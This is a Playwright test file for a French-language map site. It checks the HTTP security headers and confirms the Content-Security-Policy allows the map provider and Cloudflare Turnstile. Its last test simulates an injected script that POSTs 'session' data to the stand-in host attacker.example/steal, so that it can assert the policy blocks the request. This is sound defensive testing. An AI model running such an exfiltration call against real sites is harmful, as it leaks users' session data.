// Security headers on the production build, and the Content-Security-Policy
// blocks nothing the site needs: every page is opened and any violation the
// browser reports fails the test.
import { expect, test } from "@playwright/test";

const PAGES = [
  // The map: style, tiles, glyphs and sprites from the map provider.
  { path: "/", ready: /stations affichées/ },
  // The sign-in form: Cloudflare's anti-robot script and frame.
  { path: "/compte", ready: /Recevoir un code/, frame: "challenges.cloudflare.com" },
  { path: "/vehicule", ready: null },
  { path: "/legal/confidentialite", ready: null },
];

test("security headers are sent", async ({ request }) => {
  const headers = (await request.get("/")).headers();
  expect(headers["x-content-type-options"]).toBe("nosniff");
  expect(headers["x-frame-options"]).toBe("DENY");
  expect(headers["referrer-policy"]).toBe("strict-origin-when-cross-origin");
  expect(headers["permissions-policy"]).toContain("geolocation=(self)");
  expect(headers["content-security-policy"]).toContain("frame-ancestors 'none'");
  expect(headers["strict-transport-security"]).toContain("max-age=63072000");
  expect(headers["x-powered-by"]).toBeUndefined();
});

for (const { path, ready, frame } of PAGES as { path: string; ready: RegExp | null; frame?: string }[]) {
  test(`CSP blocks nothing the page needs: ${path}`, async ({ page }) => {
    // Collect the browser's own violation reports, from the very first script.
    await page.addInitScript(() => {
      (window as unknown as { cspViolations: string[] }).cspViolations = [];
      document.addEventListener("securitypolicyviolation", (event) => {
        (window as unknown as { cspViolations: string[] }).cspViolations.push(
          `${event.violatedDirective} ${event.blockedURI}`,
        );
      });
    });
    await page.goto(path);
    if (ready) await expect(page.getByText(ready).first()).toBeVisible({ timeout: 15_000 });
    if (frame) {
      // Turnstile keeps talking to Cloudflare (never "network idle"): wait for its
      // frame instead, which proves the policy let its script and frame load.
      // (The frame sits in Turnstile's shadow DOM: look in the page's frame list.)
      await expect
        .poll(() => page.frames().some((child) => child.url().includes(frame)), { timeout: 20_000 })
        .toBe(true);
      await page.waitForTimeout(2_000);
    } else {
      // Leave time for the map tiles to load.
      await page.waitForLoadState("networkidle");
    }

    const violations = await page.evaluate(() => (window as unknown as { cspViolations: string[] }).cspViolations);
    expect(violations).toEqual([]);
  });
}

test("CSP: an injected script can't send data to another domain", async ({ page }) => {
  await page.goto("/legal/conditions");
  const sent = await page.evaluate(async () => {
    try {
      await fetch("https://attacker.example/steal", { method: "POST", body: "session" });
      return true;
    } catch {
      return false;
    }
  });
  expect(sent).toBe(false);
});
